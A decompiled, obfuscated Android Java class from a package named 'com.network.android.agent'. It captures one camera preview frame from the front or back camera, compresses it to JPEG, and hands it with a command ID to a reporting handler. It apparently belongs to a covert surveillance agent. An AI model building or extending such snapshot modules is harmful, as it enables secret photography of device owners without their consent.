package com.network.media;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.YuvImage;
import android.hardware.Camera;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.a;
import com.network.i.e;
import java.io.ByteArrayOutputStream;

/* access modifiers changed from: package-private */
public final class b implements Camera.PreviewCallback {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ int f163a;
    final /* synthetic */ int b;
    final /* synthetic */ String c;

    b(int i, int i2, String str) {
        this.f163a = i;
        this.b = i2;
        this.c = str;
    }

    public final void onPreviewFrame(byte[] bArr, Camera camera) {
        try {
            a.a("CameraUtil onPreviewFrame data length: " + bArr.length);
            a.a("CameraUtil onPreviewFrame sourceType: " + this.f163a + ",resolution: " + this.b);
            Camera.Parameters parameters = camera.getParameters();
            a.a();
            a.a("CameraUtil onPreviewFrame stopCamera");
            if (bArr == null || bArr.length == 0) {
                a.a("(data == null) || (data.length == 0)");
                return;
            }
            a.a("CameraUtil onPreviewFrame stoped");
            Camera.Size previewSize = parameters.getPreviewSize();
            a.a("CameraUtil onPreviewFrame width: " + previewSize.width + ", height: " + previewSize.height);
            YuvImage yuvImage = new YuvImage(bArr, parameters.getPreviewFormat(), previewSize.width, previewSize.height, null);
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, yuvImage.getWidth(), yuvImage.getHeight()), 50, byteArrayOutputStream);
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            BitmapFactory.Options options = new BitmapFactory.Options();
            if (this.b == 2) {
                options.inSampleSize = 1;
            } else if (this.b == 1) {
                options.inSampleSize = 2;
            } else if (this.b == 0) {
                options.inSampleSize = 3;
            }
            Bitmap decodeByteArray = BitmapFactory.decodeByteArray(byteArray, 0, byteArray.length, options);
            ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
            decodeByteArray.compress(Bitmap.CompressFormat.JPEG, 50, byteArrayOutputStream2);
            byte[] byteArray2 = byteArrayOutputStream2.toByteArray();
            String b2 = e.b();
            String str = this.f163a == 1 ? "Front-res" + this.b + "-" + b2 + ".jpg" : "Back-res" + this.b + "-" + b2 + ".jpg";
            a.a("CameraUtil Picture taken:" + str + " size: " + byteArray2.length);
            Context a2 = NetworkApp.a();
            if (this.c != null) {
                com.network.android.c.a.b.a(this.c);
            }
            a.a(a2, byteArray2, b2, str, this.c, this.f163a, "jpg");
        } catch (Throwable th) {
            a.a("CameraUtil Exception- " + th.getMessage(), th);
            a.a();
            if (this.c != null) {
                com.network.android.c.a.b.a(0, 25, "LOG_CAMERA_SNAPSHOT_FAILED", com.network.h.b.c(this.c));
                com.network.android.c.a.b.a(0, -15534, "", com.network.h.b.c(this.c));
            }
        }
    }
}
